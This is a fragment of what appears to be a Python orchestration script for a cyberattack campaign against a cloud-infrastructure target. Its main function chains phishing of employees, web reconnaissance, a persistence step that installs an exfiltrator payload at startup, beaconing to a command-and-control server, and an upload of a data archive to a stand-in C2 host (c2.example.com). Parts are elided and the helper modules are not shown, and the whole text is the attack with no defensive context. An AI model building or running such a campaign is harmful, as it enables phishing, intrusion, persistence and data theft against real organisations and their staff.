...
def main():
    """
    Main function to run the cloud_infrastructure_campaign campaign.
    """
    print(f"[*] Starting cloud_infrastructure_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("cloud_infrastructure_employees.txt")
    run_tool("apt_web_recon.js", "--target cloud_infrastructure.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/data_and_disrupting_services_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-CLOUD_INFRASTRUCTURE-01")
    ...
    exfiltration.exfiltrate_data("data_and_disrupting_services/data_and_disrupting_services.zip", "https://c2.example.com/upload")
    run_tool("payloads/data_and_disrupting_services_exfiltrator.py")
